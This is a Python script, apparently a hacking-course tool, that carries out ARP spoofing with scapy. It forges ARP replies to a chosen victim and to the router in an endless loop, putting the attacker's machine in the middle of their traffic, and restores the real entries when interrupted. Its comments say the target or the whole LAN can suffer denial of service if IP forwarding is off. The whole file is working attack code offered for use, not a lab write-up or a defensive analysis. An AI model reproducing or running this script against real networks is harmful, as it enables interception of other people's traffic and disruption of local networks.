#!/usr/bin/python3



# THIS PROGRAM RUNS UNTIL INTERRUPTED BY KEYBOARD INTERRUPT
# TO SPOOF THE MAC ADDRESSES OF THE ROUTER IN A LAN
# WITH THAT OF OURS

# NOTE:-
# IF IP FORWARDING IS DISABLED IN ATTACKER MACHINE
# THE TARGET (AND MAYBE THE ENTIRE LAN) CAN FACE DoS

# TO KEEP INTERNET CONNECTIVITY IN THE NETWORK ALIVE
# IP FORWARDING MUST BE ENABLED BEFORE EXECUTING THE SCRIPT
# echo 1 > /proc/sys/net/ipv4/ip_forward


import scapy.all as sc
import optparse as op			# handles all the -h -o <OPTION> command line option parsing used in the Linux environment
import sys						# sys (system) module is used to handle the command line arguments
from termcolor import colored	# use colored text output on the terminal



def getMAC(ip):

	# using scapy syntax and methods
	
	arp_req = sc.ARP(pdst=ip)													# sends an arp request to the pdst IP address
	broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")								# sends broadcast in the broadcast MAC (value in dst)
	finalPacket = broadcast/arp_req												# final packet is concatenation of the arp request and broadcast
	
	resp = sc.srp(finalPacket, timeout=2, verbose=False)[0]						# this response packet is what we receive after sending the finalPacket and retrieving the first part [0]
	mac = resp[0][1].hwsrc														# location of the MAC is stored at [0][1].hwsrc of the response packet
	return mac



# THIS FUNCTION SPOOFS THE MAC ADDRESS OF THE TARGET
# AS WELL AS THE ROUTER TO EACH OTHER
# BY SENDING IN SPOOFED PACKETS TO BOTH 

def arpSpoof(targetIP, spoofIP):

	mac = getMAC(targetIP)														# calls the getMAC() function to retrieve the MAC address for the corresponding tagetIP
	sp_packet = sc.ARP(op=2, hwdst=mac, pdst=targetIP, psrc=spoofIP)			# this is the spoofed packet - sent as response to the target machine, disguised as the router and vice versa
	sc.send(sp_packet, verbose=False)											# send the packet



# THIS FUNCTION RESTORES THE DEFAULT ARP ENTRIES
# IN THE TARGET MACHINE AND ROUTER
# BY SENDING A LEGITIMATE PACKET WITH THE 
# REAL IP-MAC ARP ENTRY INFORMATION

def restore(src, dest):

	tMAC = getMAC(dest)
	sMAC = getMAC(src)
	
	pack = sc.ARP(op=2, pdst=dest, hwdst=tMAC, psrc=src, hwsrc=sMAC)
	sc.send(pack, verbose=False)



def main():


	parser = op.OptionParser('Usage:- \n' + 'arpSpoofer.py -I <VICTIM_IP> -R <ROUTER_IP>')						# show user how to use the program [syntax to use]
	parser.add_option('-I', dest='vip', type='string', help='Specify IP address of victim client machine')	
	parser.add_option('-R', dest='rip', type='string', help='Specify IP address of the target router')
	(options, args) = parser.parse_args()																	# parse arguments given through command line	
	
	vicIP = options.vip
	routIP = options.rip
	
	if len(sys.argv) != 5 :				# incorrect # of parametres to work with
		print(parser.usage)
		quit()
	
	try:
		print("[+] Spoofing the target and router!")
		print(colored("[!] IP forwarding must be enabled so that the target doesn't get DoS", "green"))
		while(True):					# infinite loop of arp spoofing and DoS
			arpSpoof(vicIP, routIP)		# spoof the target client
			arpSpoof(routIP, vicIP)		# spoof the router		
		
	except KeyboardInterrupt:
		print("[!] Stopping the arpspoofing process!")
		restore(vicIP, routIP)
		restore(routIP, vicIP)
		quit()
main()
